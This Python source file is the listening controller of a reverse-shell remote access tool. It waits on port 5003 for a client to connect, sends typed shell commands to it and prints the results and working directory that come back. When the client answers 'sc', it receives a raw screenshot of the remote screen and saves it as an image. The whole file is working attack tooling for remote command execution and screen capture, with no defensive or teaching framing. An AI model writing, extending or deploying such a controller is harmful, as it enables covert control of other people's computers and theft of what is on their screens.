import socket
import cv2
import numpy as np
import pyautogui

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
SCREEN_SIZE = tuple(pyautogui.size())
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
   
    command = input(f"{cwd} $> ")
    print(command)
    if not command.strip():
       
        continue
   
    client_socket.send(command.encode())
   
    output = client_socket.recv(BUFFER_SIZE).decode()

    if output == "sc":
       
       
       
        frame_size_bytes = client_socket.recv(8)
        frame_size = int.from_bytes(frame_size_bytes, byteorder='big')

       
        received_data = b''
        total_received = 0
        while total_received < frame_size:
            data = client_socket.recv(BUFFER_SIZE)
            received_data += data
            total_received += len(data)

       
        frame = np.frombuffer(received_data, dtype=np.uint8)
        frame = frame.reshape((SCREEN_SIZE[1], SCREEN_SIZE[0], 3))
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

       
        cv2.imwrite('received_frame.png', frame)
        continue
       
   
    results, cwd = output.split(SEPARATOR)
   
    print(results)